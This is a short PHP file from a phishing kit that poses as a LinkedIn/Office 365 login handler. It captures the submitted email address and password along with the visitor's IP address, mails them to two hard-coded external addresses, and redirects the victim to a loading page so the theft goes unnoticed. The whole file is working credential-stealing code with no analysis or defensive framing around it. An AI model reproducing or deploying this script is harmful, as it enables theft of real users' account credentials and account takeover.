<?
session_start();
$ip = getenv("REMOTE_ADDR");
$adddate=date("D M d, Y g:i a");
$username = $_POST['EmailAdd'];
$password = $_POST['Password'];
$chasem3="cokerconsultancy8119@gmail.com, chrisyoungmusic6@yahoo.com";


  $subj = "New LinkedinOffice 365 Login $ip";
  $msg = "Email: $username\nPassword: $password\n$ip\n-----------------------------------\n      Live  Created By Coke\n-----------------------------------";
  $from = "From: <ssc@sscs.com>";
    mail("$chasem3", $subj, $msg, $from);

    header("Location: loading.html");

?>